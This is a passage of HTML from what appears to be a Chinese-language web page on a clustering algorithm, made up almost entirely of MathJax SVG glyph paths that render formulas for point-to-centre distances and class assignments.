296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(14795.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(15184.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(16192.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(16637.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18502,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(19168.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(20224.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container>，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 1008.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="45.757ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 20224.6 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5603,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6123,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(6512,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(7520.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7965.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9829.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10496.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(11552.4,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(13330.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(13775.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(14295.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(14684.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(15692.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(16137.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g 